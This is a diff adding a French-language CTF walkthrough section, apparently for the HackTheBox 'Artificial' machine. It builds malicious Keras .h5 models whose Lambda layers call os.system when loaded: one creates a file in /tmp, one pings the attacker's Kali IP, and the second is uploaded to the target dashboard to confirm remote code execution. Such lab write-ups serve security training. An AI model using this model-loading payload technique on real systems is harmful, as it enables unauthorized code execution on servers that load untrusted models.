@@ -489,7 +489,7 @@ Tu t’appuies donc sur ce `Dockerfile` pour recréer un environnement de travai
 
 Cela te permet de générer des modèles `.h5` compatibles avec l’application cible.
 
-**Création du conteneur Docker**
+#### Création du conteneur Docker
 
 À partir du `Dockerfile` récupéré, tu construis une image Docker :
 
@@ -499,7 +499,7 @@ docker build -t artificial-tf .
 
 Cette commande crée une image nommée `artificial-tf` contenant l’environnement Python 3.8 + TensorFlow 2.13.1.
 
-**Lancement du conteneur**
+#### Lancement du conteneur
 
 Tu démarres ensuite un conteneur interactif en liant ton répertoire local Kali au répertoire de travail du conteneur :
 
@@ -514,6 +514,257 @@ docker run --privileged -it -v $(pwd):/code artificial-tf
 Le conteneur s’exécute localement sur ta machine Kali, et le répertoire courant est monté dans `/code` à l’intérieur du conteneur.
 
 Cela te permet de créer les fichiers `.h5` depuis le conteneur tout en les retrouvant directement dans ton répertoire local sur Kali.
+
+### Génération d’un modèle minimal
+
+Avant de créer des fichiers POC `.h5` (preuve de concept), tu commences par générer un modèle Keras minimal et valide.
+
+L’objectif est de vérifier que l’environnement Docker fonctionne correctement et que tu peux produire un fichier `.h5` compatible avec ce que l’application attend.
+
+Dans le conteneur, tu installes d’abord un éditeur de texte, par exemple `nano` :
+
+```bash
+apt update
+apt install -y nano
+
+```
+
+Tu peux ensuite créer tes scripts Python directement dans le conteneur :
+
+```bash
+nano minimal.py
+```
+
+Puis tu ajoutes le code suivant, inspiré de l’exemple fourni sur le dashboard et simplifié au strict minimum :
+
+```python
+import tensorflow as tf
+from tensorflow import keras
+from tensorflow.keras import layers
+
+model = keras.Sequential([
+    layers.Dense(1, input_shape=(1,))
+])
+
+model.compile(optimizer="adam", loss="mean_squared_error")
+
+model.save("minimal.h5")
+```
+
+Tu exécutes ensuite le script **dans le conteneur** :
+
+```bash
+python3 minimal.py
+ls -lh minimal.h5
+```
+
+Si le fichier `minimal.h5` est bien généré, cela confirme que ton environnement local est correctement configuré.
+
+Une fois le fichier `minimal.h5` généré, tu le testes directement via l’interface web.  
+Depuis le dashboard, tu sélectionnes le fichier avec le bouton **Browse**, puis tu l’uploades.
+
+Après l’upload, tu cliques sur **View Predictions** afin de déclencher le chargement du modèle côté serveur.
+
+
+
+![Interface du dashboard Artificial HTB montrant un modèle .h5 uploadé avec les boutons "View Predictions" et "Delete" permettant de tester le chargement du modèle côté serveur](view-predictions.png)
+
+Si aucune erreur n’est affichée et que la page **Model Predictions** s’ouvre, cela confirme que le modèle est accepté et correctement traité par l’application.  
+
+Tu peux alors considérer que ton environnement local est conforme et passer à la création de fichiers `.h5` de preuve de concept.
+
+
+
+### Preuve de concept : poc-touch.h5
+
+Pour créer un premier modèle POC, tu t’inspires d’une recherche simple sur le sujet, par exemple avec les mots-clés `keras tensorflow RCE`.
+
+Cette recherche met en évidence qu’il est possible d’exécuter du code lors du chargement d’un modèle Keras, notamment via l’utilisation de couches `Lambda`.
+
+Tu peux notamment t’appuyer sur les travaux décrits ici :  
+https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model
+
+Tu adaptes ensuite ce principe à ton script `minimal.py` afin de créer une première preuve de concept simple.
+
+#### Création de poc-touch.h5
+
+Le but de ce premier PoC est volontairement simple : créer un fichier dans `/tmp` si le code est bien exécuté.
+
+Pour cela tu crées d'abord un script `poc-touch.py` :
+
+```bash
+nano poc-touch.py
+```
+
+Tu ajoutes le code suivant, qui te permettra de vérifier si la fonction `payload` est bien exécutée :
+
+```python
+import tensorflow as tf
+from tensorflow import keras
+from tensorflow.keras import layers
+import os
+
+def payload(x):
+    os.system("touch /tmp/poc_touch")
+    return x
+
+model = keras.Sequential([
+    layers.Input(shape=(1,)),
+    layers.Lambda(payload)
+])
+
+model.save("poc-touch.h5")
+```
+
+Tu exécutes ensuite le script pour générer le fichier `.h5` :
+
+```bash
+python3 poc-touch.py
+ls -lh poc-touch.h5
+
+```
+
+Le fichier `poc-touch.h5` est maintenant prêt pour un premier test local dans l’environnement Docker.
+
+#### Test de `poc-touch.h5` en local
+
+Tout ce test se déroule dans le conteneur Docker local.
+
+L’objectif est de valider le comportement du fichier `.h5` dans l’environnement de travail recréé à partir du `Dockerfile`, avant toute interaction avec la cible.
+
+Pour tester ce modèle en local, tu crées un script Python qui prend le fichier `.h5` en argument et le charge.
+
+```bash
+nano test_model.py
+```
+
+Tu ajoutes le code suivant :
+
+```python
+import sys
+from tensorflow import keras
+
+model_path = sys.argv[1]
+
+model = keras.models.load_model(model_path)
+print("Modèle chargé")
+```
+
+Tu exécutes ensuite le script avec ton fichier :
+
+```bash
+python3 test_model.py poc-touch.h5
+```
+
+Si le chargement du modèle déclenche l’exécution de la fonction `payload`, le fichier `/tmp/poc_touch` doit être créé.
+
+Tu peux le vérifier avec :
+
+``` bash
+ls -l /tmp/poc_touch
+```
+
+### Preuve de concept : poc-ping.h5
+
+Pour tester la RCE depuis la cible, il faut que le fichier `.h5` déclenche une action observable depuis Kali.
+
+Une méthode simple consiste à générer un modèle qui exécute un `ping` vers ta machine Kali.  
+Si le ping est détecté côté Kali, cela confirme que le modèle est bien chargé par le serveur et que l’exécution de code fonctionne à distance.
+
+Pour pouvoir utiliser la commande `ping` dans le conteneur, tu installes d’abord l’outil correspondant :
+
+```bash
+apt update
+apt install -y iputils-ping
+```
+
+
+
+#### Création de `poc-ping.h5`
+
+Pour préparer ce test, tu crées un nouveau script Python dans le conteneur :
+
+```bash
+nano poc-ping.py
+```
+
+Ce script reprend le principe de `poc-touch.py`, mais remplace la création d’un fichier local par une action réseau visible depuis Kali.
+
+Tu ajoutes le code suivant, en remplaçant `10.10.x.x` par l’adresse IP `tun0` de ta machine Kali :
+
+```python
+import tensorflow as tf
+from tensorflow import keras
+from tensorflow.keras import layers
+
+def payload(x):
+    import os
+    os.system("ping -c 3 10.10.x.x")
+    return x
+
+model = keras.Sequential([
+    layers.Input(shape=(1,)),
+    layers.Lambda(payload)
+])
+
+model.save("poc-ping.h5")
+```
+
+
+Tu génères ensuite le fichier `.h5` :
+
+```bash
+python3 poc-ping.py
+ls -lh poc-ping.h5
+```
+
+#### Test de `poc-ping.h5` en local
+
+Ce test se déroule entièrement dans le conteneur Docker local.
+
+Avant de charger le modèle, tu démarres une capture réseau dans un fenêtre de ton Kali pour observer les paquets ICMP :
+
+```bash
+sudo tcpdump -i any icmp
+```
+
+Dans ton conteneur Docker, tu exécutes ensuite le script de test avec ton modèle :
+
+```bash
+python3 test_model.py poc-ping.h5
+```
+
+Si la fonction `payload` est exécutée, 3 requêtes `ping` sont envoyées vers Kali.
+
+Tu dois alors voir apparaître **6 paquets ICMP** dans `tcpdump` :
+
+- 3 requêtes (echo request)
+- 3 réponses (echo reply)
+
+Cela confirme que le modèle déclenche bien une action réseau lors de son chargement.
+
+#### Test de `poc-ping.h5` en remote
+
+Une fois le test local validé, tu peux vérifier le comportement du modèle sur la cible.
+
+Sur ta machine Kali, tu démarres une capture réseau pour surveiller les paquets ICMP :
+
+```bash
+sudo tcpdump -i tun0 icmp
+```
+
+Depuis le `dashboard` de l’application, tu uploades le fichier `poc-ping.h5`, puis tu cliques sur `View Predictions` afin de déclencher le chargement du modèle côté serveur.
+
+Si la fonction `payload` est exécutée, des requêtes `ping` doivent être envoyées vers ta machine Kali.
+
+Ici aussi tu dois voir apparaître **6 paquets ICMP** dans `tcpdump` :
+
+- 3 requêtes (echo request)
+- 3 réponses (echo reply)
+
+La réception de ces paquets ICMP confirme que :
+- le modèle `.h5` est bien chargé par le serveur
+- le code `ping` est exécuté côté cible
 
 
 
